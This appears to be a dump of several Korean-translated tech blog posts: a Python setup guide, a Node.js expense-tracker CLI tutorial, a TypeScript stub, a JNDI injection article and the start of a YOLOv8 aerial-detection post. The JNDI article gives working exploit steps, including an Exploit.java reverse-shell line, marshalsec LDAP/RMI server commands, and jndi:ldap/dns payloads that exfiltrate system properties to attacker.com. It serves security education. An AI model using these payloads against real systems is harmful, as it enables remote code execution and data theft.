겁니다.\n\n\n# 3. 가상 환경 설정\n\n\n\n\n이 부분은 코딩을 시작하기에 필수적이지는 않아요. 그러나 이점을 따르는 것이 좋은 습관을 형성하는 데 도움이 될 거예요. 이를 염두에 두고, 먼저 '가상 환경'이 무엇인지에 대해 이야기해볼게요.\n\n가상 환경은 Python에서 프로젝트 간의 의존성을 분리하는 방식입니다.\n\n걱정 마세요. 아직이 개념을 이해하지 못할 것으로 기대하지는 않아요. 대신 예를 들어 설명해 드릴게요. 예를 들어 PyGame 라이브러리를 사용하여 새 게임을 개발하려고 한다고 상상해 보세요. 가장 최신 버전인 PyGame 1.7.10을 설치하고 'Pixelator'를 개발하는 데 1년을 보내게 됩니다.\n\nPixelator가 대성공을 거두어 투자자들이 이제 'Pixelator II'에 참여해 달라고 요청합니다. 그때에는 PyGame의 새로운 버전, PyGame 2.1.0이 출시되었다는 사실을 알게 되지만 이번에 추가된 많은 새로운 기능을 사용해 보고 싶어할 거예요. 최신 버전을 다운로드하고 설치한 후, 열심히 작업한 끝에 Pixelator II를 출시할 준비가 되는 거죠.\n\n\n\n하지만 기다려봐요. 이제 특별판 릴리스를 위해 원래 Pixelator를 조정해야 합니다. PyGame 1.7.10을 2.1.0으로 업그레이드하는 과정에서 원래 게임을 실수로 망가뜨렸다는 것을 깨달았습니다. 1.7.10에서 사용한 일부 기능이 폐기되었을 수도 있고, PyGame의 이전 버전과 함께 작동했던 다른 패키지가 새 버전과 함께 작동하도록 업데이트되지 않았을 수도 있습니다. 그럼 어떻게 해야 할까요? Pixelator II가 망가지지 않도록 PyGame의 이전 버전으로 다운그레이드할 수는 없습니다. 이것은 의존성 악몽에 빠진 상황입니다.\n\n이것이 가상 환경이 해결해주는 정확한 문제입니다.\n\nPixelator를 위한 가상 환경(에 PyGame 1.7.10 설치)과 Pixelator II를 위한 다른 가상 환경(에 PyGame 2.1.0 설치)을 만들면 이제 의존성 충돌 없이 두 프로젝트에 모두 작업할 수 있습니다.\n\n각 가상 환경은 해당 가상 환경에 설치된 Python 버전(예: Python 3.12.3)과 라이브러리를 저장하는 폴더로 작동합니다. 이를 통해 컴퓨터에 다른 Python 버전을 실행하고 동일한 라이브러리의 다른 버전을 설치할 수 있게 됩니다. 협업하고 싶으세요? 문제 없어요. 가상 환경은 쉽게 내보내고 공유할 수 있어서 코드가 모든 컴퓨터에서 작동하도록 보장합니다.\n\n\n\n요약하면, 가상 환경은 다음을 제공합니다:\n\n- 의존성 격리: 가상 환경은 프로젝트 의존성을 격리시켜 서로 다른 프로젝트가 동일한 라이브러리의 다른 버전을 요구할 때 충돌을 방지합니다.\n- 이식성: 가상 환경은 쉽게 공유하고 다른 기계에 복제할 수 있으며 일관된 개발 환경을 유지합니다.\n\n그 결론은? 각 프로젝트마다 새로운 가상 환경을 만드세요. 이렇게 하면 필요에 따라 쉽게 환경을 전환할 수 있습니다.\n\n그리고 여기까지입니다. Python을 다운로드하세요. Jupyter Notebook을 설치하세요. 가상 환경을 설정하세요. 이제 첫 번째 Python 프로그램을 작성할 준비가 모두 끝났습니다!\n\n\n\n만약 읽은 내용이 마음에 들었다면, 다음 시리즈 \"제로베이스부터 파이썬 배우기\"도 기대해주세요.\n\n# 읽어 주셔서 감사합니다\n\n설정하는 데 문제가 있으신가요? 댓글에서 도와드릴게요!","ogImage":{"url":"/assets/img/2024-05-15-ABeginnersGuidetoPythonGettingSetUpLikeAPro_0.png"},"coverImage":"/assets/img/2024-05-15-ABeginnersGuidetoPythonGettingSetUpLikeAPro_0.png","tag":["Tech"],"readingTime":4},{"title":"Nodejs를 사용하여 지출 추적기를 만드는 방법","description":"","date":"2024-05-15 10:08","slug":"2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs","content":"\n\n\u003cimg src=\"/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_0.png\" /\u003e\n\n- 소개:\n\nNode.js를 배우면서 Node.js를 사용하여 지출 추적 애플리케이션을 만들었습니다. 이 포괄적인 가이드에서는 Node.js를 사용하여 처음부터 직접 지출 추적 앱을 구축하는 과정을 안내하겠습니다. 먼저 개발 환경을 설정하고 프로젝트 구조를 초기화하는 것부터 시작하여 지출 모델을 만들고 지출을 관리하기 위한 CRUD 작업을 구현하는 방법을 살펴볼 것입니다. CLI(명령줄 인터페이스)를 구축하여 사용자 상호 작용을 처리하고 파일 I/O 작업을 사용하여 데이터 지속성을 다루는 방법을 배울 수 있습니다.\n\n2. 개발 환경 설정 및 종속성 설치:\n\n\n\nNode.js 앱을 초기 설정할 때는 'npm init' 명령어를 사용하고 'yargs'와 'chalk' npm 패키지를 설치하세요.\n\n3. 명령줄 인터페이스 구축:\n\n'yargs.command()'를 사용하여 add-expense, list, search, remove, total, highest 및 average와 같은 다양한 명령어를 정의하세요. 각 명령어는 개별적인 기능을 제공합니다. 예를 들어, add-expense 명령은 제목, 카테고리 및 금액을 사용하여 비용을 추가합니다. 모든 명령어를 정의한 후에는 yargs.parse() 메서드를 호출하여 명령줄 인수를 구문 분석하고 해당 명령어 핸들러를 실행합니다. 각 명령어는 명령어가 호출될 때 실행될 핸들러 함수를 지정합니다. 이러한 핸들러 함수는 expenses.js 모듈에 정의된 해당 함수를 호출하는 역할을 합니다.\n\n```js\nyargs.command({\n    command: 'add-expense',\n    describe: '새 비용 추가',\n    builder : {\n        title: {\n            describe: '비용 설명/제목',\n            demandOption: true,\n            type: 'string'\n        },\n        category: {\n            describe: '비용 카테고리',\n            demandOption: true,\n            type: 'string'\n         },\n        amount: {\n            describe: '비용 금액',\n            demandOption: true,\n            type: 'number'  \n        }\n    },\n    handler(argv){\n        expenses.addExpense(argv.title, argv.category, argv.amount)\n    }\n})\n```\n\n\n\n위의 코드는 add-expense 명령을 정의하는데, 이 명령은 제목, 카테고리 및 금액을 추가해야 합니다. 이 인수들은 핸들러 함수를 통해 addExpense 함수로 전달되며, add-expense 명령을 호출할 때마다 실행됩니다. 비슷하게, 나는 목록, 검색, 제거, 총합, 최고값, 평균과 같은 다양한 명령들을 생성했습니다.\n\n4. 지출 관리 작업 (expenses.js)\n\n지출 추적기 CLI가 견고하고 신뢰할 수 있도록 하기 위해, 파일 입출력 작업을 이용한 데이터 영속성을 구현할 것입니다. 지출 데이터를 로컬에 저장할 JSON 파일을 만들어, 사용자들이 세션 간에 지출 내역에 접근할 수 있도록 합니다.\n\nA) add-expense: 이 함수는 CLI를 통해 제목, 카테고리 및 금액을 받아와서, 제목이 중복되지 않는 경우 JSON 파일에 추가합니다. 파일 입출력 작업을 사용합니다.\n\n\n\n```js\nconst addExpense = (title, category, amount) =\u003e {\n    const current_exp = loadExpenses();\n    const duplicateExpense = current_exp.find((exp) =\u003e exp.title === title);\n    if (!duplicateExpense) {\n        current_exp.push({\n            title: title,\n            category: category,\n            amount: amount\n        });\n        saveExpenses(current_exp);\n        console.log(chalk.green.inverse('새 경비가 성공적으로 추가되었습니다!'));\n    } else {\n        console.log(chalk.red.inverse('경비 제목이 이미 추가되었습니다! 다른 지출을 시도해보세요'));\n    }\n}\n```\n\nB) list: listExpenses 기능은 JSON 파일에 저장된 모든 경비를 검색하고 형식에 맞게 표시합니다.\n\n```js\nconst listExpenses = () =\u003e {\n    const expenses = loadExpenses();\n    console.log(chalk.blue.underline.bold('귀하의 지출 내역은 다음과 같습니다:'));\n    expenses.forEach((exp, idx) =\u003e {\n        console.log(`${idx + 1}. 제목: ${exp.title}, 카테고리: ${exp.category}, 금액: ${exp.amount}`);\n    });\n}\n```\n\nC) search: searchExpenses 기능은 CLI를 통해 카테고리를 입력받고 해당 카테고리에 속한 모든 지출을 나열합니다.\n\n\n\n\n```js\nconst searchExpenses = (category) =\u003e {\n    const expenses = loadExpenses();\n    const curr_categoryexp = expenses.filter(exp =\u003e exp.category === category);\n    if (curr_categoryexp.length\u003e0) {\n        console.log(chalk.blue.underline.bold(`Expenses by ${category} are:`));\n         curr_categoryexp.forEach((exp,idx)=\u003e{\n            console.log(`${idx+1}. Under ${exp.category} category we have expense titled ${exp.title} for amount ${exp.amount}`)\n    })\n    } else {\n        console.log(chalk.red.inverse(`No category named ${category} found`))\n    }\n}\n```\n\nD) remove: The removeExpenses function takes in a title via command line and removes that expense.\n\n```js\nconst removeExpense = (title) =\u003e {\n    const expenses = loadExpenses()\n    const expensesToKeep = expenses.filter((exp) =\u003e exp.title !== title)\n    if (expenses.length \u003e expensesToKeep.length) {\n        //console.log(expensesToKeep.length, expenses.length)\n        console.log(chalk.greenBright.inverse('Expense Removed!'))\n        saveExpenses(expensesToKeep)\n    } else {\n        console.log(chalk.redBright.inverse(`Expense titled ${title} not found!`))\n    }\n}\n```\n\nE) total: The calculateTotalExpenses function calculates the total amount spent\n```js\nconst calculateTotalExpenses = () =\u003e {\n    const expenses = loadExpenses();\n    let total = 0;\n    expenses.forEach(exp =\u003e {\n        total += exp.amount;\n    });\n    console.log(chalk.yellow.bold(`Total amount spent is: ${total}`));\n}\n```\n\n\n\n```js\nconst calculateTotalExpenses = () =\u003e {\n    const expenses = loadExpenses();\n    const total = expenses.reduce((acc, curr) =\u003e acc + curr.amount, 0);\n    console.log(chalk.cyan.bold(`총 비용: ${total}`));\n}\n```\n\nF) highest: getHighestExpensePerCategory 함수는 각 카테고리별로 소비된 최고 금액을 계산하고 표시합니다.\n\n```js\nconst getHighestExpensePerCategory = () =\u003e {\n    const expenses = loadExpenses();\n    const highest = {};\n    expenses.forEach(exp =\u003e {\n        if (!highest[exp.category] || exp.amount \u003e highest[exp.category]){\n            highest[exp.category] = exp.amount;\n        }\n    });\n    console.log(chalk.yellowBright.underline('카테고리별 최고 지출:'));\n    for (const [category, amount] of Object.entries(highest)){\n        console.log(`${category}: ${amount.toFixed(3)}`);\n    }\n}\n```\n\nG) average: getAverageExpenseByCategory 함수는 각 카테고리별로 평균 비용을 계산합니다.\n\n\n\n\n```js\nconst getAverageExpenseByCategory = () =\u003e {\n    const expenses = loadExpenses();\n    const categories = {} // category: {total,count}\n    expenses.forEach(exp =\u003e {\n        if(categories[exp.category]){\n            categories[exp.category].total += exp.amount;\n            categories[exp.category].count += 1;\n\n        }   else{  // for new expense\n            categories[exp.category] = {\n                total: exp.amount,\n                count: 1\n            }\n        }\n    })\n    console.log(chalk.yellow.underline('Average Expense by category:'))\n    for (const [category, data] of Object.entries(categories)) {\n        const average = data.total / data.count;\n        console.log(`${category} : ${average.toFixed(3)}`)\n    }\n}\n```\n\n5. 파일 입출력 작동 방식:\n\nsaveExpense() 함수가 호출될 때마다, 지출 객체를 JSON 문자열로 변환하고 이를 expenselist.json 파일에 저장합니다. JSON 문자열을 JavaScript 객체로 다시 변환하려면, 파일을 동기적으로 읽고 데이터를 문자열로 변환한 뒤, 배열 객체로 변환하기 위해 파싱해야 합니다.\n\n```js\n// 지출 객체를 JSON 문자열로 변환\nconst saveExpenses = (expense) =\u003e {\n    const dataJSON = JSON.stringify(expense)\n    fs.writeFileSync('expenselist.json', dataJSON)\n}\n```\n\n\n\n파일 작업에 대해 더 알아보려면 https://nodejs.org/api/fs.html을 방문해보세요.\n\n6. addExpense() 함수의 Flow Diagram:\n\n![Flow Diagram](/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_1.png)\n\n위 다이어그램은 addExpense() 함수의 로직이 어떻게 작동하는지 이해하는 데 도움이 됩니다. 마찬가지로, 다른 함수들에 대한 다이어그램을 만들 수도 있습니다.\n\n\n\n7. 사용자 인터페이스, 명령 구문 분석기 및 백엔드 서버 간의 흐름\n\n응용 프로그램을 구축할 때 클라이언트 측과 서버 측 간의 통신이 어떻게 이루어지는지 이해하는 것이 중요합니다. UI와 백엔드 서버가 어떻게 연결되는지 이해하고자 아래에 명령 처리 방식을 보여주는 다이어그램을 만들었습니다.\n\n- 흐름 및 명령은 사용자 인터페이스에서 시작되어 사용자가 입력을 제공합니다.\n- 명령 구문 분석기는 입력을 구문 분석하여 명령을 식별하고 명령 실행 구성 요소로 전달합니다.\n- 명령 실행에 의해 백엔드 서버의 해당 기능이 트리거되어 요청된 작업을 수행합니다.\n- 작업이 완료되면 백엔드 서버가 응답을 보내며, 해당 응답은 사용자 인터페이스를 통해 사용자에게 표시되거나 전달됩니다.\n\n![다이어그램](/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_2.png)\n\n\n\n8. 샘플 입력-출력:\n\n이 샘플 입력과 출력은 비용 추적기 응용 프로그램 내에서 각 명령이 작동하는 방식을 보여줍니다. 사용자들이 비용을 효과적으로 관리하고 분석할 수 있는 기능을 제공합니다. 만들어 둔 입력 및 관련 명령에 대한 통찰력을 얻기 위해 언제든지 `--help` 명령을 사용할 수 있습니다.\n\n![이미지](https://miro.medium.com/v2/resize:fit:1322/1*kroYcWIHG79M4MO9wqJWFA.gif)\n\n9. 결론:\n\n\n\nNode.js와 명령줄 인터페이스의 힘을 활용하여, 저희는 재정 관리를 간편화하고 소비 습관에 대한 소중한 통찰력을 제공하는 도구를 만들었어요. JavaScipt의 힘을 빌려 견고하고 효율적인 명령줄 응용 프로그램을 만들었습니다. 이 글을 통해 명령어 구문 분석, 파일 입출력 작업을 사용한 데이터 관리, 그리고 지출에 대한 통찰력을 추출하기 위한 계산의 복잡성에 대해 살펴보았어요.\n\n계속되는 학습과 코드의 끝없는 가능성에 건배해요!","ogImage":{"url":"/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_0.png"},"coverImage":"/assets/img/2024-05-15-AnapproachtobuildanExpenseTrackerusingNodejs_0.png","tag":["Tech"],"readingTime":8},{"title":"TypeScript에서 타입 복잡성을 줄이는 3가지 명쾌한 단계","description":"","date":"2024-05-15 10:07","slug":"2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps","content":"\n\n해당되는 TypeScript 프로젝트가 이해하기 어려웠던 적이 있나요? 그럴 때 왜 그랬는지 궁금했던 적이 있나요? 두 가지 질문에 대한 답이 있습니다.\n\n지난 몇 년 동안, 저는 TypeScript 프로젝트의 코드 복잡성을 줄이는 데 상당한 시간을 보냈습니다. 널리 알려진 주장과는 달리, TypeScript 기능을 무분별하게 사용하는 것은 특히 경험이 부족한 엔지니어들이 시도할 때 코드베이스를 복잡하게 만들 수 있습니다. 타입을 줄이는 아이디어를 보여드리고 싶습니다...","ogImage":{"url":"/assets/img/2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps_0.png"},"coverImage":"/assets/img/2024-05-15-HowIReduceTypeComplexityinTypeScriptwith3Clear-cutSteps_0.png","tag":["Tech"],"readingTime":1},{"title":"JNDI Injection - 전체 이야기","description":"","date":"2024-05-15 10:05","slug":"2024-05-15-JNDIInjectionTheCompleteStory","content":"\n\n이 블로그는 JNDI Injection의 보안 문제를 조사합니다. JNDI Injection은 악의적인 사용자가 JNDI lookups를 조작하여 미인가된 코드를 실행할 수 있는 취약점입니다.\n\n소개\n\nJava Naming and Directory Interface (JNDI)는 네이밍 및 디렉터리 서비스와 상호 작용을 용이하게 해주는 Java API입니다.\n\n이를 통해 Java 애플리케이션이 위치가 아닌 이름을 통해 데이터와 리소스를 발견하고 검색할 수 있습니다.\n\n\n\n이러한 객체들은 원격 메서드 호출(Remote Method Invocation, RMI), 공통 객체 요청 브로커 아키텍처(Common Object Request Broker Architecture, CORBA), 경량 디렉터리 액세스 프로토콜(Lightweight Directory Access Protocol, LDAP), 또는 도메인 이름 서비스(Domain Name Service, DNS)와 같은 다양한 네이밍 또는 디렉토리 서비스에 저장될 수 있습니다.\n\n아키텍처\n\n- JNDI 아키텍처는 API와 서비스 제공자 인터페이스(SPI)로 구성됩니다.\n- SPI를 통해 다양한 네이밍 및 디렉토리 서비스가 투명하게 연결되어 Java 애플리케이션이 JNDI API를 사용하여 그들의 서비스에 접근할 수 있도록 합니다.\n- 더 알아보기: https://docs.oracle.com/javase/tutorial/jndi/overview/index.html\n\n![이미지](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png)\n\n\n\nJNDI의 주요 기능\n\n1. 객체 바인딩\n\n- JNDI는 자바 객체를 네이밍/디렉터리 서비스의 이름에 바인딩하는 것을 가능하게 합니다.\n\n2. 검색 및 쿼리\n\n\n\n- 응용 프로그램은 이름이나 속성을 기반으로 객체를 조회하거나 쿼리하는 데 JNDI를 사용할 수 있습니다. 이를 통해 런타임에 리소스나 서비스를 동적으로 검색할 수 있습니다.\n\n3. SPI를 통한 확장성\n\n- JNDI는 Service Provider Interfaces (SPIs)를 통해 다양한 디렉터리 서비스를 지원합니다. 이 SPI들은 JNDI를 다양한 네이밍 및 디렉토리 시스템과 통합할 수 있도록 합니다.\n\n네이밍 및 디렉토리 서비스 이해\n\n\n\n1. 네이밍 서비스\n\n- 네이밍 서비스는 이름과 객체를 관련시키고 ‘lookup’ 작업을 사용하여 이름에 따라 객체를 찾는 기능을 제공합니다.\n\n```java\nContext ctx = new InitialContext(env);\nMyObject obj = (MyObject) ctx.lookup(\"myObject\");\n```\n\n2. 디렉터리 서비스\n\n\n\n- 이름 대신 속성을 기반으로 디렉터리 객체를 저장하고 검색할 수 있는 특별한 유형의 네이밍 서비스입니다.\n\n```javascript\nDirContext ctx = new InitialDirContext(env);\nNamingEnumeration\u003c?\u003e namingEnum = ctx.search(\"ou=people\", \"(cn=Sickurity Wizard)\");\n```\n\n취약점\n\n아래는 기본적인 JNDI 클라이언트 애플리케이션입니다:\n\n\n\n```java\npublic class SimpleJndiLookup {   \n    public static void main(String[] args) {\n        Hashtable\u003cString, String\u003e env = new Hashtable\u003c\u003e();\n        env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.ldap.LdapCtxFactory\");\n        env.put(Context.PROVIDER_URL,\"rmi://localhost:9999\");\n        try {\n            Context ctx = new InitialContext(env);\n            Object obj = ctx.lookup(\"object\");\n            System.out.println(obj);\n            ctx.close();\n        } catch (NamingException e) {\n            System.err.println(\"Problem encountered during lookup: \" + e);\n        }\n    }\n}\n```\n\n공격자가 개체의 이름을 제어할 수 있다면, 그들은 RMI/LDAP/CORBA 서버로 리디렉션하여 임의의 개체를 반환할 수 있습니다. 이 개체가 JNDI 네이밍 참조의 인스턴스인 경우, JNDI 클라이언트는 이에 연결된 \"classFactory\" 및 \"classFactoryLocation\" 속성을 해결하기를 시도합니다. 만약 \"classFactory\" 값이 대상 Java 애플리케이션에 알려지지 않은 경우, Java는 지정된 \"classFactoryLocation\" 위치에서 공장의 바이트코드를 Java의 URLClassLoader를 사용하여 검색합니다. 원격 또는 로컬로 참조 공장을로드 할 때, 포함된 RCE 페이로드가 실행됩니다.\n\n참고\n\n# JNDI 공격\n\n\n\n\nJNDI 공격은 LDAP, RMI, CORBA 및 DNS와 같은 다양한 SPI를 사용하여 수행될 수 있습니다.\n\n**공격 흐름**\n\n- 대상 응용 프로그램 내에서 InitialContext.lookup(URI)가 호출됩니다. 여기서 URI는 사용자가 제어합니다.\n- 공격자는 URI 매개변수를 조작하여 악의적인 RMI 서비스를 가리키도록 하며, 이를 위해 rmi://hacker.rmi/exploit과 같은 URL을 사용합니다.\n- 공격자의 RMI 서버는 Reference 객체를 반환합니다. 이 Reference 객체에는 특별히 제작된 Factory 클래스가 포함되어 있습니다.\n- 대상 응용 프로그램은 Factory 클래스를 동적으로 로드하고 인스턴스화하며, 그런 다음 factory.getObjectInstance()를 호출하여 외부 원격 객체 인스턴스를 얻습니다.\n- 이 Factory 클래스의 인스턴스화는 악성 코드의 실행을 유발합니다. 이 코드는 Factory 클래스의 생성자, 정적 블록 또는 getObjectInstance() 메서드 내부에 작성되며 원격 코드 실행 (RCE)을 달성하기 위해 사용될 수 있습니다.\n\n이 기술은 오라클이 RMI에 코드베이스 제한을 추가하기 이전인 Java 8u121까지 잘 작동했습니다.\n\n\n\n위험을 방지하기 위해 가한 변경 사항은 다음과 같습니다:\n\n-\tRMI\n    -\tcom.sun.jndi.ldap.object.trustURLCodebase\n    -\tJDK 6u132, 7u122, 8u113 이후부터 이 속성은 기본값으로 false를 가집니다.\n    -\tJNDI를 통해 가져온 RMI 객체가 원격으로 제공된 코드베이스 URL에서 자동으로 클래스 정의를 로드하는 것을 방지합니다.\n    -\t여기서 SecurityManager는 더 이상 로드할 수 있는 것을 제한합니다.\n\n\n\n\n![Image 1](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_1.png)\n\n2. LDAP\n\n- com.sun.jndi.ldap.object.trustURLCodebase\n- This property has a default value of false starting from JDK 6u211, 7u201, 11.0.1, 8u191, and later versions.\n- Disables the automatic loading of Java class definitions from remote locations for objects retrieved via LDAP services in JNDI.\n\n![Image 2](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_2.png)\n\n\n\n\n3. Corba\n\n- com.sun.jndi.cosnaming.object.trustURLCodebase\n- JNDI를 통해 검색된 객체에서 원격 위치로부터 자바 클래스 정의를 자동으로로드하는 것을 비활성화합니다.\n\n![image](/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_3.png)\n\n오래된 JDK 버전에서 JNDI를 악용하기\n\n\n\n- 귀하의 악의적인 코드가 포함된 Exploit.java 파일을 만듭니다.\n\n```js\npublic class Exploit {\n    static {\n        try {\n          java.lang.Runtime.getRuntime().exec⠀(\"curl burp.com\");\n          // java.lang.Runtime.getRuntime().exec⠀(\"nc -e /bin/bash IP 4444\");\n        } catch (Exception e) {\n            e.printStackTrace();\n}}\n```\n\n2. 코드를 컴파일합니다.\n\njavac Exploit.java -source 8 -target 8\n\n\n\n3. Exploit.class를 Http 서버에 호스팅하세요.\n\n```bash\npython3 -m http.server 8081\n```\n\n4. LDAP/RMI 서버를 실행하세요. 이곳에서는 marshalsec을 사용하여 서버를 시작합니다.\n\n```java\n#LDAP\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://PythonServerServingRemoteClass:8081/#Exploit\"\n```\n\n\n\n```js\n#RMI\njava -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer  \"http://PythonServerServingRemoteClass:8081/#Exploit\"\n```\n\n5. Execute Payload\n\n- LDAP : ldap://LDAPServerIP:1389/Exploit\n- RMI : rmi://RMIServerIP:1099/Exploit\n\n## Exploiting JNDI in Newer JDK Versions\n\n\n\n\n새로운 JDK 버전에서 JNDI 취약점을 완화하기 위해 시행된 제한 사항에도 불구하고, 여전히 공격자가 그들을 악용할 수 있는 시나리오를 설명하는 몇 가지 상황을 소개합니다.\n\n1. trustURLCodebase가 True로 설정된 경우\n\n- com.sun.jndi.ldap.object.trustURLCodebase가 명시적으로 True로 설정된 경우, 이는 그 제한을 해제하고 기본 악용을 사용하여 악용될 수 있습니다.\n\n```js\nSystem.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\"); //LDAP\n```\n\n\n\n2. DNS 메시지 조회를 통한 남용\n\n- 최신 Java 버전에서는 JNDI 원격 클래스 로딩이 금지되었지만, 메시지 조회 메커니즘 자체는 여전히 작동합니다.\n- 탐지 - `$'jndi:dns://attacker.com/gg`\n- DNS 데이터 유출→ `$'jndi:ldap://$'BELOWPAYLOADHERE'.attacker.com/gg`\n- 예시 Payloads\n  - main:argumentName → 명령행 인수의 값 유출\n  - sys:propname ⠀⠀⠀ → 시스템 속성 값 유출(예: user.name)\n\n3. 로컬 클래스 경로에서의 공격성 팩토리 클래스 남용\n\n- 더 높은 버전에서는 악의적 Factory가 원격으로 로드되지는 않지만, 공격자는 여전히 제공된 JNDI Reference를 통해 Factory 클래스와 해당 속성을 지정할 수 있습니다.\n- 공격자는 취약한 프로그램의 클래스 경로에 있는 어떤 Factory 클래스든 가젯으로 재사용할 수 있습니다.\n- 사용 가능한 Factory 클래스는 다음과 같은 속성을 가질 것입니다:\n\n\n\n\n1) 취약한 프로그램의 클래스 경로에 존재해야 합니다.\n2) ObjectFactory 인터페이스를 구현해야 합니다.\n3) getObjectInstance 메서드를 구현해야 합니다.\n4) Reference의 속성을 사용하여 위험한 작업을 수행해야 합니다.\n\n예시 가젯 클래스\n\n- BeanFactory\n\n- 여기서는 Reference의 문자열 속성에만 의존하여 임의의 Java 코드 객체가 생성됩니다(Reflection을 사용).\n- 이와 관련하여 org.apache.naming.factory.BeanFactory를 로컬 공장 클래스로 사용하고, javax.el.ELProcessor 클래스를 대상 클래스로 사용하고, EL 표현식을 사용하여 명령을 실행할 수 있습니다.\n- org.apache.naming.factory.BeanFactory 클래스(Tomcat과 함께 제공됨)가 클래스 경로에 있는 경우, 기본 JRE/JDK 버전과 관계없이 RCE를 달성할 수 있습니다.\n- 이에 대한 자세한 내용은 다음 블로그에서 확인할 수 있습니다: https://www.cnblogs.com/Welk1n/p/11066397.html\n- 그러나 이는 아래 Tomcat 버전에서 수정되었습니다.\n\n\n\n\n\n8.5.x는 8.5.79 버전 이후에 사용 가능합니다.\n9.0.x는 9.0.63 버전 이후에 사용 가능합니다.\n10.0.x는 10.0.21 버전 이후에 사용 가능합니다.\n10.1.x는 10.1.0-M14 버전 이후에 사용 가능합니다.\n\n보안 연구원들에 의해 발견된 여러 다른 가젯들이 있습니다.\n\n이 블로그를 작성하는 동안, 취약점을 실험하기 위해 여러 개의 랩을 만들었습니다. 다음은 시도해 볼 수 있는 저장소 링크입니다: Jndi-Injection-Labs\n\n다음 파트에서는 LDAP 독려가 JNDI 취약점 악용에 어떻게 사용될 수 있는지 살펴볼 것입니다.\n\n\n\n\n트위터에서 제 소식을 확인해보세요: [https://twitter.com/sickuritywizard](https://twitter.com/sickuritywizard)\n\n해킹 즐기기...\n\n참고 자료\n\n- [A Journey From JNDI/LDAP Manipulation To RCE](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)\n- [JNDI RCE 취약점 분석](https://www.cnblogs.com/Welk1n/p/11066397.html)\n- [JNDI Exploit Kit](https://github.com/pimps/JNDI-Exploit-Kit)","ogImage":{"url":"/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png"},"coverImage":"/assets/img/2024-05-15-JNDIInjectionTheCompleteStory_0.png","tag":["Tech"],"readingTime":8},{"title":"자체제작 스파이 군사 작전에서 YOLOv8 객체 검출 활용하기","description":"","date":"2024-05-15 04:57","slug":"2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations","content":"\n\n적군 항공기를 계산하기 위해 YOLOv8 Object Detection과 정찰 드론에서 촬영한 항공 영상을 활용하여 군사 작전을 계획하기 위해서 지리공간 정보를 활용하세요.\n\n![image](/assets/img/2024-05-15-DIYforaSpyUtilizingYOLOv8ObjectDetectioninMilitaryOperations_0.png)\n\n몇몇 분들께서는 이전에 작성한 제 글 중 하나인 \"마음대로 쓰는 이용사나 ‘머신’에 대해 읽으셨을 것입니다. 그 글에서는 '머신'이라고 하는 세계 감시 복합체의 다양한 구성 요소를 소개했습니다. 이 인프라는 전 세계에 배치된 다양한 수단을 포함하여 정부가 개인, 사회 행동 및 심지어 전 세계의 군사 시설을 모니터링할 수 있게 해주는 종합 감시를 가능하게합니다. 지리공간 정보(GEOINT)는 이러한 노력에서 중요한 역할을 합니다.\n\n이 글에서는 적대적 군사 비행기 기지를 추적하는 도구로서의 지리공간 정보(GEOINT)에 대해 다뤄보겠습니다. 이러한 위치와 그들의 비행기를 효과적으로 모니터링함으로써 그들에 대한 전투 작전 계획을 철저히 준비할 수 있습니다.\n\n\n\n## YOLOv8 Object Detection\n\nYOLOv8는 Ultralytics에서 개발한 유명한 실시간 객체 검출 시스템으로, 광범위한 응용 분야에서 널리 사용되고 있습니다. 군사 감시 및 정찰을 포함한 다양한 분야에서 사용되며, 이미지나 비디오 프레임 내의 객체를 실시간으로 감지하기 위해 설계되었습니다. 차량, 인원 또는 장비와 같은 객체들을 신속하고 정확하게 특정하여 상황 인식 및 대상 추적에 중요한 역할을 합니다.\n\n딥러닝과 합성곱 신경망(CNN)과 함께 PyTorch를 활용함으로써, YOLOv8은 한 장면 내에서 여러 객체를 동시에 감지하는 능력을 보여주며 높은 속도와 정확도를 달성합니다. 이것이 바로 저희 미션에서 사용하기로 결정한 이유입니다.\n\n## Prerequisites\n\n\n\n우선, 코드 실행을 위해 Google Compute Engine 백엔드에 Python 3을 사용하기로 결정했고, Google Colab을 사용할 것입니다. 따라서 우리는 먼저 의존성을 설치해야 합니다.\n\n```js\n!pip install ultralytics\n```\n\n이 설치 중에는 opencv-python, torch, pandas 및 이 패키지에서 사용해야 하는 기타 필수 의존성들이 설치됩니다.\n\n```js\nimport cv2\nimport urllib.request\n\nfrom ultralytics import YOLO, checks, hub\nfrom google.colab.patches import cv2_imshow\n```\n\n\n\n위 목록에서 볼 수 있듯이, 실험 중에 사용될 모든 필요한 라이브러리를 가져옵니다. 울트랠라틱스 모듈 외에도 Google Colab에서 올바르게 작동하는 cv2의 핫픽스인 cv2_imshow도 포함됩니다. urllib.request는 공개 저장소에서 이미지 예제를 다운로드하는 데 사용됩니다.\n\n## YOLOv8 모델\n\n객체 감지를 위해 설계된 딥 러닝 모델 YOLOv8는 입력 이미지를 그리드로 분할하여 작동합니다. 그런 다음 각 그리드 셀 내의 객체에 대한 바운딩 박스와 클래스 확률을 예측합니다. 이 모델의 효율성은 신경망을 통한 전체 이미지의 단일 피드포워드 패스를 처리할 수 있는 능력에서 나옵니다.\n\n일반적으로 모델을 만들려면 각 이미지에 대한 이미지와 레이블을 추가하여 데이터 세트를 올바르게 준비해야 합니다. 그러나 초기 단계 프로젝트에 필요한 대부분의 데이터 세트를 포함하는 데이터베이스가 이미 존재합니다. 오늘은 이를 실험에 활용할 것입니다. Roboflow 웹사이트로 이동해봅시다.\n\n\n\n![DIY for a Spy: Utilizing YOLOv8 Object 